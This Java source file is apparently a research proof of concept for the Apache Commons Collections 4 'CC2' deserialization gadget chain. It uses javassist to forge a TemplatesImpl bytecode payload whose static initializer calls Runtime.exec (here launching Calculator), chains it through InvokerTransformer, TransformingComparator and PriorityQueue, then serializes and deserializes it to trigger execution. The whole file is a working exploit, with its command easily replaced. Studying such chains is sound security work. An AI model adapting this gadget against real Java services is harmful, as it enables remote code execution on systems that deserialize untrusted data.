package CommonsCollections2;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.*;
import java.io.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 1:37 上午
 */
public class CommonsCollectionsGadget2 {
    public static void CC2() throws NoSuchMethodException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NotFoundException, CannotCompileException, IOException{
        Class c1 = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer");
        Constructor constructor = c1.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("CommonsCollectionsEvilCode");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);
        ctClass.writeFile("./");

        byte[] ctClassBytes = ctClass.toBytecode();
        byte[][] targetByteCodes = new byte[][]{ctClassBytes};

        TemplatesImpl templates = new TemplatesImpl();
        Class clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field _name = clazz.getDeclaredField("_name");
        Field _bytecode = clazz.getDeclaredField("_bytecodes");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetByteCodes);
        _tfactory.set(templates, new TransformerFactoryImpl());

        TransformingComparator transformingComparator = new TransformingComparator(transformer);
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class c2 = Class.forName("java.util.PriorityQueue");
        Field _queue = c2.getDeclaredField("queue");
        _queue.setAccessible(true);
        Object[] queue_array = new Object[]{templates,1};
        _queue.set(priorityQueue,queue_array);

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        try {
            // 序列化操作
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2EvilGadget2.bin"));
            outputStream.writeObject(priorityQueue);
            outputStream.close();
            // 反序列化操作
            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2EvilGadget2.bin"));
            inputStream.readObject();
            inputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC2();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
